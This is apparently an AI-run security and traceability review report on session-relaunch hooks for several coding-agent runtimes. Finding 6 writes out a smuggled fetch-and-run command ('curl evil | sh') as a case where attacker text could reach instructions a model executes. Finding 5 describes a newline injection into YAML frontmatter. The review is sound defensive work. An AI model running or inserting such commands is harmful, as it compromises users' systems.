# Deep Review — Iteration 002

## Dispatcher

- Command: `/deep:review` (loop owner, `.skilled/commands/deep/review.md`), dispatching `@deep-review` once per iteration.
- Mode: `review`; execution: single review iteration; state source: externalized files.
- Session: `2026-11-13T04:30:08Z`, generation 1, lineage `new`; run 2 of max 3.
- Review target: `specs/hooks-plugins-extensions/session-turn-boundaries/002-session-relaunch-loop/038-goal-and-workflow-resume` (type `spec-folder`).
- Budget profile: `verify` (13 analysis actions, at the contract's hard cap; config `maxToolCallsPerIteration` is 12).
- Prior state: P0=0 P1=1 P2=3, dimension correctness `partial`.
- Dimension note (recorded ambiguity): the dispatch assigns security (D2) then traceability (D3), while `deep-review-strategy.md` §11 still points at correctness and `lib/nudge.cjs`. The dispatch was followed; the divergence is recorded as an edge case and the strategy Next Focus was rotated.

## Files Reviewed

- `.skilled/bin/skilled-loop-shell.sh:1-335` (full read; wrapper resolution, trust list, runtime functions, manual `skilled-loop` function).
- `.skilled/hooks/session-relaunch/lib/nudge.cjs:60-349` (command builders, `handoffText` frontmatter template, `seedText`, `seedInstructions`, repo-root resolution).
- `.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:280-639` (`printManualClaim`, `recordGoalPacket` stderr, `validatedNote`, `prepare`, `keep`).
- `.skilled/hooks/session-relaunch/lib/relaunch-core.cjs:600-680` (Claude goal reason vocabulary) and `:1425-1480` (`manualClaimCommand`, `manualTemplateProblem`, `MISSING_EVENT_POLICIES`).
- `.skilled/hooks/goal/pi/goal-context.ts:1-321` (full read; env handling, one-shot bind, fail-open handlers).
- `.opencode/plugins/opencode-goal.js:3000-3020` (continuation guard, `SKILLED_LOOP_ID`) and `:3590-3605` (session-created bind and packet delete).
- `.skilled/hooks/hook-flags.env.example:1-90` (switch precedence and process-env-only settings).
- Traceability reads: `002-pi-bind-once/spec.md`, `005-opencode-continuation-hop/spec.md`, `006-skilled-loop-command/spec.md` (requirement headings, success criteria, NFR-S/NFR-R; full bodies not read).

Not read this iteration (carried to Next Focus): `001-workflow-reentry-seed`, `003-goal-resolver-prepare`, `004-claude-start-claim`, `007-goal-handover-docs`, every `acceptance-criteria.md`, `commands/speckit/handoff.md`, the goal-hook playbook, `session-relaunch/README.md`, the goal test suites, and the wrapper test suites.

## Findings - New

### P0 Findings

None.

### P1 Findings

None new. Prior active P1 `R1-P1-001` (startup claim emitted under an inferred wrong hook event name, `.skilled/hooks/session-relaunch/claude/compact-pointer.mjs:198-201`) remains active and still forces the conditional verdict; no counterevidence was found this iteration and none was sought, since the claude adapters were out of this iteration's dimension.

### P2 Findings

5. **Handoff-note frontmatter is templated with unescaped `session_id` and `cwd` values** -- `.skilled/hooks/session-relaunch/lib/nudge.cjs:154` -- Description: `handoffText` builds the exact YAML frontmatter the model is told to write. `spec_folder` is normalized first (`:133`), and `loop_id`/`runtime`/`created_at` are internal values, but `session_id` is interpolated raw at `:154` and `cwd` raw at `:157`. The session id comes from `sessionIdFor` (`.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:358-368`), which accepts any non-empty `--session` value or `CLAUDE_CODE_SESSION_ID` with no shape check. `validatedNote` later parses the note and trusts its `cwd` as a goal root (`.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:430`, `:443`, passed to `recordGoalPacket` roots at `:397`).
   Finding class: class-of-bug
   Scope proof: `handoffText` is the only frontmatter producer in the module and validates only `spec_folder`; `codexRolloutPath` in the same library already rejects session ids outside `/^[A-Za-z0-9._-]+$/` (`.skilled/hooks/session-relaunch/lib/relaunch-core.cjs:678`), so the codebase already treats a session id as a token that needs a shape check.
   Affected surface hints: ["handoffText frontmatter", "sessionIdFor", "validatedNote goal roots"]
   Case: a `--session` value or a checkout path containing a newline (both legal, neither validated) makes the written note carry an extra frontmatter line, and `prepare` then reads a `cwd:` the operator never intended and uses it when resolving goal roots.

6. **`commandPrefix` returns any caller-supplied `cliPath` starting with `node ` verbatim, bypassing the quoting every other value gets** -- `.skilled/hooks/session-relaunch/lib/nudge.cjs:64-68` -- Description: `commandPrefix` treats `/^node\s/` as proof that the value is already a command line and returns it unquoted; every other value is `shellQuote`d. Its output is embedded in nudge and seed text the model is instructed to execute (`:191`, `:197`, `:243`, `:285`) and in `keep`'s stdout (`.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:607-609`). In-repo callers pass the constant `USAGE_PROGRAM` (`session-relaunch.cjs:25`) or the default `CLI_COMMAND`, so there is no current reach; the function is exported (`.skilled/hooks/session-relaunch/lib/nudge.cjs:781`) and its contract accepts arbitrary caller text.
   Finding class: class-of-bug
   Scope proof: all three command builders (`claimCommandFor`, `completeCommandFor`, `handoffText`) call `commandPrefix`, so the guard is the single site for the whole class; no in-repo caller passes untrusted text today, which is why the reach is hypothetical and the severity is P2.
   Affected surface hints: ["commandPrefix", "handoffText", "seedText", "keep stdout"]
   Case: an adapter or future caller passes a config- or env-derived `cliPath` such as `node /x/cli.js; curl evil | sh`; the `node ` prefix passes the guard and the whole string is rendered into instructions the model runs.

7. **OpenCode deletes the hand-over packet env var without a `finally`, unlike Pi, so a failed bind leaks it to the next session** -- `.opencode/plugins/opencode-goal.js:3016` -- Description: the `session.created` branch sets `runtimeState.handOverGoalAttempted = true`, awaits `bindRelaunchGoal(...)`, then `delete process.env[RELAUNCH_GOAL_PACKET_ENV]` (`:3599`) with no `try/finally`. Pi's equivalent wraps the bind in `try`/`finally` with the explicit reason "Never leave the packet where a new session or a nested runtime could bind it" (`.skilled/hooks/goal/pi/goal-context.ts:108-113`). If the bind throws (fs or read failure inside the core bind path), the delete is skipped and the packet stays in the process environment.
   Finding class: cross-consumer
   Scope proof: `rg 'delete process.env\[RELAUNCH_GOAL_PACKET_ENV\]'` returns exactly one production site, `.opencode/plugins/opencode-goal.js:3599`, which is unguarded; the Pi site deletes in `finally`. Child packet `005-opencode-continuation-hop/spec.md` SC-002 states the variable is undefined "after the one bind attempt" with no error carve-out.
   Affected surface hints: ["opencode-goal session.created bind", "pi bindHandOverGoal", "005 SC-002"]
   Case: `bindRelaunchGoal` rejects while reading the packet; the delete never runs, and a later top-level session in the same process, or a child runtime inheriting the environment, binds the stale packet to the wrong session.

## Traceability Checks

| Protocol | Level | Status | Evidence |
|---|---|---|---|
| `spec_code` | core | partial | `002-pi-bind-once` SC-003 and NFR-R01 checked against `.skilled/hooks/goal/pi/goal-context.ts:99-113`; `006-skilled-loop-command` SC-001 and NFR-S01 checked against `.skilled/bin/skilled-loop-shell.sh:325-335`; `005-opencode-continuation-hop` SC-002 checked against `.opencode/plugins/opencode-goal.js:3014-3019` and contradicted on the error path (finding 7). Packets 001, 003, 004 and 007 are unchecked (deferred). |
| `checklist_evidence` | core | deferred | No `acceptance-criteria.md` was opened this iteration, so no Met row is claimed. Iteration 3 owns closure, which is also the only iteration left. |
| `skill_agent` | overlay | deferred | No skill or agent file is in the changed-code path for security; `commands/speckit/handoff.md` is a command doc still unread. |
| `agent_cross_runtime` | overlay | notApplicable | No agent definition is in the review scope; the cross-runtime comparison that did run (Pi vs OpenCode bind cleanup) is recorded under `spec_code`. |
| `feature_catalog_code` | overlay | deferred | Not reached; no catalog entry was named in the dispatch. |
| `playbook_capability` | overlay | deferred | `.skilled/skills/cli-external-orchestration/cli-opencode/manual-testing-playbook/goal-hook/goal-hook.md` was not read; its capability claims stay unverified. |

Success-criterion notes (code reading only, no suite executed):

- `002` SC-003: `SESSION_RELAUNCH_GOAL_PACKET` is deleted after the first id-bearing attempt on Pi — `goal-context.ts:104-113`, with the empty-id case exempted by NFR-R01.
- `002` NFR-R01: a missing or empty variable and an empty session id return before the bind; a bind error can escape `bindHandOverGoal` because it is `try/finally` without `catch`, but both Pi call sites wrap it in fail-open `catch` blocks (`:262-265`, `:285-288`), so no turn or session start is blocked.
- `005` SC-002: normal path only; the error path is finding 7.
- `006` SC-001: a bash function is printed by `command -v`, so the definition at `skilled-loop-shell.sh:325` satisfies the criterion on inspection; it was not executed.
- `006` NFR-S01: satisfied — the manual function runs the wrapper from `${skilled_loop_sourced_checkout}/.skilled/bin/skilled-loop`, where the checkout is the real path of the sourced shim (`:57-69`), so it adds no cwd-derived trust decision (see Ruled Out).
- `006` SC-002 and SC-003: both test files exist (`.skilled/hooks/session-relaunch/tests/skilled-loop-shell.test.cjs`, `skilled-loop-wrapper-claim-goal.test.cjs`) but neither was run, so the exit-0 evidence is unverified.

## Integration Evidence

- Loop owner: `.skilled/commands/deep/review.md` (`/deep:review`) — dispatcher; no file read beyond the rendered prompt.
- Append gateway: `.skilled/skills/system-deep-loop/runtime/scripts/append-mode-event.cjs` — the only writer of `review/deep-review-state.jsonl`; invoked with this iteration's single-record file.
- Reducer: `.skilled/skills/system-deep-loop/runtime/scripts/reduce-state.cjs` — owns the findings registry and dashboard; not invoked by this agent.
- Reviewed integration surfaces: the session-relaunch CLI (`bin/session-relaunch.cjs`) as the printer of the manual claim command that the shim's `skilled-loop` function must run; the Pi extension (`goal-context.ts`) and the OpenCode plugin (`opencode-goal.js`) as the two consumers of `SESSION_RELAUNCH_GOAL_PACKET`; the shim's runtime functions as the producers of the wrapper launch that the CLI `prepare` arms.

## Edge Cases

- **Dispatch/strategy divergence**: the dispatch named security then traceability; the strategy still named correctness and `lib/nudge.cjs`. The dispatch won, and correctness coverage nonetheless improved because `nudge.cjs` and the CLI prepare path were read. No direction was re-entered from the exhausted list.
- **Prior verdict text inside the strategy's Next Focus**: `deep-review-strategy.md` §11 ended with `Review verdict: CONDITIONAL` appended to the focus bullet. That is template drift, not a code finding; the strategy was rewritten this iteration.
- **Tests not executed**: every success criterion above is code-reading evidence only. No `node --test` run, no `scratch/red.txt`/`green.txt` comparison.
- **Finding 5 reach is unproven**: no recorded host payload carries a newline in its session id or cwd. The finding stays P2; confirm reach before promoting it.
- **Finding 7 error path is unproven reachable**: `bindRelaunchGoal`'s throw surface was not exercised; the parity gap with Pi is proven, the failure trigger is not.
- **Finding 6 has no current reach**: no in-repo caller passes a non-constant `cliPath`; reported as hardening on the guard itself.
- **Coverage shortfall, recorded not masked**: traceability core is partial and every overlay is deferred; four child packets and every acceptance row remain unread with one iteration left.

## Confirmed-Clean Surfaces

- `manualClaimCommand` escaping (`.skilled/hooks/session-relaunch/lib/relaunch-core.cjs:1436-1440`) escapes `\ " $ ` and the backtick, and moves each `!` outside the double quotes, so history expansion cannot fire inside the seed.
- `handoffPathWithinRepo` plus the post-parse `spec_folder` re-validation and existence check in `validatedNote` (`.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:415-455`) reject a note path outside the repo and a packet folder that does not exist.
- `refuseForShellChild` parses `CLAUDE_PID` as a positive integer and refuses otherwise (`.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:286-292`).
- `codexRolloutPath` rejects session ids outside `/^[A-Za-z0-9._-]+$/` before building a filesystem path (`.skilled/hooks/session-relaunch/lib/relaunch-core.cjs:678`).
- The shim's wrapper resolution requires the candidate's real path to sit inside the sourced checkout, an explicit `SKILLED_LOOP_TRUSTED_CHECKOUTS` entry, or a `git worktree list` entry for the sourced checkout (`.skilled/bin/skilled-loop-shell.sh:233-281`); the runtime functions pass `"$@"` quoted and use `command "$binary"` to bypass functions and aliases (`:296-309`).
- The shim's manual `skilled-loop` function resolves the wrapper from the shim's own checkout, so a pasted claim cannot select a wrapper from the current directory (`.skilled/bin/skilled-loop-shell.sh:320-334`).
- Pi clears the hand-over packet in `finally`, so a bind error cannot leave it for a nested runtime (`.skilled/hooks/goal/pi/goal-context.ts:108-113`).
- `goal-reason` text on stderr is a fixed vocabulary plus a match count (`.skilled/hooks/session-relaunch/lib/relaunch-core.cjs:644-647`), so no goal text reaches the terminal through `.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:410`.
- `hook-flags.env.example` documents that the master kill switch and per-runtime flags beat enable flags, and that `SESSION_RELAUNCH_REPO_ROOT` is read from the process environment only (`.skilled/hooks/hook-flags.env.example:1-90`).

## Ruled Out

- **Manual `skilled-loop` skipping `skilled_loop_real_path` containment**: the function runs `${skilled_loop_sourced_checkout}/.skilled/bin/skilled-loop`, and the checkout is the canonical real path of the sourced shim (`.skilled/bin/skilled-loop-shell.sh:52-69`), so no current-directory path is trusted. Child packet 006 NFR-S01 holds; not a finding.
- **`SKILLED_LOOP_TRUSTED_CHECKOUTS` colon splitting**: the value is operator-supplied; a path containing `:` can only truncate or rename an entry, never widen trust to a checkout the operator did not list (`.skilled/bin/skilled-loop-shell.sh:243-260`).
- **Pi leaving `SESSION_RELAUNCH_GOAL_PACKET` set when the session id is empty**: intentional deferral to the first attempt that has an id (`.skilled/hooks/goal/pi/goal-context.ts:99-107`), and NFR-R01 defines the empty-id case as unchanged.
- **Pi fail-open `catch` masking goal-state errors**: documented and required at all three lifecycle points (`.skilled/hooks/goal/pi/goal-context.ts:262-265`, `:285-288`, `:316-319`).
- **Unquoted `git log --since` in the compaction seed**: the timestamp already goes through `shellQuote` (`.skilled/hooks/session-relaunch/lib/nudge.cjs:274-275`).
- **Terminal-escape injection through `goal not carried:`**: the reason comes from two fixed strings and a count (`.skilled/hooks/session-relaunch/lib/relaunch-core.cjs:644-647`), not from goal or packet text.
- **`hook-flags.env.example` precedence drift**: the documented order (master kill switch, then per-runtime value, then global enable) matches the refusal messages in `relaunchRefusal` (`.skilled/hooks/session-relaunch/bin/session-relaunch.cjs:462-473`).

## Next Focus

- Dimension: traceability (D3), core then overlay; maintainability (D4) only if traceability finishes inside budget.
- Focus area: child packets `001-workflow-reentry-seed`, `003-goal-resolver-prepare`, `004-claude-start-claim` and `007-goal-handover-docs` against their code; every `acceptance-criteria.md` row for 002, 005, 006 and 007; then `commands/speckit/handoff.md` note shape and the goal-hook playbook's capability claims.
- Reason: iteration 2 spent its budget on the four named security surfaces, and these are the only remaining core and overlay protocols with zero evidence; 007 is the sole child that ties the change to the doc and playbook surfaces in scope.
- Rotation status: correctness `partial`; security `partial` (this iteration); D3 current; D4 pending.
- Blocked/productive carry-forward: productive = direct read of the producer/consumer pairs (shim↔CLI, Pi↔OpenCode packet lifecycle); blocked = none.
- Required evidence: the requirement blocks and acceptance rows of those packets with a Met/Not-Met call each, plus reads of the two doc surfaces; no suite execution substitutes for them.
- Recovery note: with one iteration left, full four-dimension coverage is not attainable; traceability core is the priority and overlays are recorded as deferred rather than silently passed.

Review verdict: CONDITIONAL
